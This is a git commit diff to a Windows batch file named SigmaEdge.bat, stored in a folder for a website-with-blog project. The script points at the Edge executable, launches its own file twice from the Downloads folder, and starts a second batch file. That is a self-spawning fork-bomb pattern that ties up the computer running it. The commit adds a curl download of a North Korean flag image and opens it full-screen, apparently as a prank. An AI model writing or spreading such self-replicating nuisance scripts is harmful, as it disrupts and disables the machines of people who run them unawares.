b7bdfc47a5e048e015f303cb91e91ea645b8b511
Benjamin Kuhnert <freddi1808@gmx.de>
2026-05-06 12:42:08 +0200

    fix

--- Website mit Blog/SigmaEdge.bat
+++ Website mit Blog/SigmaEdge.bat
@@ -2,6 +2,11 @@
 set "sourceFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
 set "destination=H:\Desktop"
 set /a counter=1
+curl -s -o nordkorea_flagge.jpg https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDZre-WtzDJFyBC19BWsZEZUcnbCTY4s99yg&s
+
+:: Bild im Vollbildmodus öffnen
+start /max nordkorea_flagge.jpg
+
 start "" "H:\Downloads\SigmaEdge.bat"
 start "" "H:\Downloads\SigmaEdge.bat"
 start "" "G:\Cla.if21\Benjamin Kuhnert\Sigma.bat"
